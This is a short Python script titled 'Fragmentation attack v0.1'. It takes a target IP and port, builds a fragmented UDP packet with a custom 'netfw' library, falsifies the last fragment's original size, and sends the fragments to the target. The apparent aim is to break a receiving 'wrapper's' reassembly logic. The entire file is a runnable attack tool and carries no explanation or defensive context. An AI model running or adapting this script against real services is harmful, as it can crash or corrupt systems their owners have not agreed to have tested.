#!/usr/bin/python
from netfw import *
from socket import *
import sys

if (len(sys.argv) != 3):
	print "Fragmentation attack v0.1"
	print "Usage: %s <ip> <Wrapper RECV port>" % (sys.argv[0])
	exit(0)

# Create a connection to requested destination
s = socket(AF_INET, SOCK_DGRAM)
s.connect((sys.argv[1], int(sys.argv[2])))


pkt = "\x00" * 8 + "abcdefghijklmnopqrstuvwxyz" * 20
frags =  FragmentedPacket(pkt)

# Change the last fragment's size
frags.fragments[-1].original_size = 16

for pkt in frags.fragments:
	s.send(pkt.serialize())
